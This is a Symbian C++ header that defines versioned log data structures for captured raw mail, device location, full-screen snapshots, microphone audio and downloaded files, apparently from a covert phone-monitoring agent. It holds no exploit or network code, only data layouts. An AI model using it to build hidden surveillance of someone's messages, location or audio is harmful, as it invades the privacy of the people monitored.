/*
 * AdditionalDataStructs.h
 *
 *  Created on: 08/set/2010
 *      Author: Giovanna
 */

#ifndef ADDITIONALDATASTRUCTS_H_
#define ADDITIONALDATASTRUCTS_H_


/*
 * Mailraw additional data
 */
#define MAPI_V2_0_PROTO    2009070301 
#define MAIL_FULL_BODY 	   0x00000001 

typedef struct TMailRawAdditionalData 
	{
		TUint32	uVersion;
		TUint32	uFlags;
		TUint32 uSize;
		TUint32 lowDateTime;
		TUint32 highDateTime;
				
		TMailRawAdditionalData() {
			uVersion = MAPI_V2_0_PROTO;
			uFlags = MAIL_FULL_BODY;
		}
	} TMailRawAdditionalData;


/*
 * Location additional data
 */
#define LOG_LOCATION_VERSION 2010082401

typedef struct TLocationAdditionalData 
	{
		TUint32	uVersion;
		TUint32	uType;
		TUint32 uStructNum;
		
		TLocationAdditionalData() {
			uVersion = LOG_LOCATION_VERSION;
			uStructNum = 0;
		}
	} TLocationAdditionalData;

	
/*
 * Snapshot additional data 
 */
#define LOG_SNAPSHOT_VERSION 2009031201

_LIT(KWindow,"Desktop");

typedef struct TSnapshotAdditionalData 
	{
		TUint32	uVersion;
		TUint32	uProcessNameLen;
		TUint32 uWindowNameLen;
		TUint wWindow[8];
		
		TSnapshotAdditionalData() {
			uVersion = LOG_SNAPSHOT_VERSION;
			uProcessNameLen = 0;                // 0 at the moment because we take the entire screen
			uWindowNameLen = 8;					// 8, length of string "Desktop", null terminated 
			TBuf<8> buf(KWindow);
			Mem::FillZ(&wWindow,8);             // wWindow must be null terminated!
			Mem::Copy(&wWindow,buf.Ptr(),buf.Size());
		}
	} TSnapshotAdditionalData;
	
/*
 * Mic Additional Data
 */	
#define MIC_LOG_VERSION 		2008121901
#define LOG_AUDIO_CODEC_AMR		0x1;

typedef struct TMicAdditionalData 
	{
		TUint32	uVersion;
		TUint32	uSampleRate;
		TUint32 lowDateTime;
		TUint32 highDateTime;
		TMicAdditionalData() {
			uVersion = MIC_LOG_VERSION;
			uSampleRate = 8000 | LOG_AUDIO_CODEC_AMR;
			lowDateTime = 0;
			highDateTime = 0;
		}
	} TMicAdditionalData;

/*
 * Download Additional Data 
 */
#define LOG_FILE_VERSION 2008122901

typedef struct TDownloadAdditionalData
	{
		TUint32	uVersion;
		TUint32	uFileNamelen;
		TBuf<256> fileName;
		TDownloadAdditionalData(){
			uVersion = LOG_FILE_VERSION;
			fileName.FillZ();
		}
	} TDownloadAdditionalData;
	
#endif /* ADDITIONALDATASTRUCTS_H_ */
